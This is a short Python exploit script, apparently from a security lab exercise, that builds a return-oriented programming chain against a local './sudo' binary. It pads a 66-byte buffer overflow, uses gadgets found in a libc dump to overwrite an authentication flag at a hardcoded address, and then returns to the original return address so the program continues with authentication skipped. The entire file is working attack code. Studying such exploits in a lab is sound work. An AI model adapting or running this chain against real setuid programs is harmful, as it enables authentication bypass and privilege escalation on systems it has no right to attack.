import os, sys, struct
import assemble
from search import GadgetSearch

OFFSET = 66
LIBC_SA = 0xb7c3a750
AUTH_ADDRESS = 0x0804A054
ORIGINAL_RA = 0x080488C6
DATA = 0x11111111
PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'

def get_arg():
    s = GadgetSearch(LIBC_DUMP_PATH, LIBC_SA)
    pop_address = s.find('pop ecx; pop eax')
    mov_address= s.find('mov [eax], ecx')
    return 'a' * OFFSET  + struct.pack('<IIIII',pop_address, DATA, AUTH_ADDRESS, mov_address, ORIGINAL_RA)

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
